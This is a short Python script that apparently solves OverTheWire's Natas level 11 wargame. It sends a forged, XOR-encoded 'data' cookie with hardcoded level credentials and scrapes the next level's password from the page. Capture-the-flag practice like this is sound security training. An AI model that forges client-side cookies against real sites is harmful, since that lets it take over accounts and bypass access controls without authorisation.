import requests
import re #regular expressions

username = "natas11"
password = "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd"

url = 'http://%s.natas.labs.overthewire.org' % username

cookie={"data":"EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/"}

session = requests.Session() #Maintains a session
#response = session.get(url , auth=(username, password))
response = session.get(url , auth=(username, password),cookies=cookie)
content = response.text

#print (session.cookies["data"])
#print (content)
print (re.findall("natas12 is (.*)<br>",content)[0])
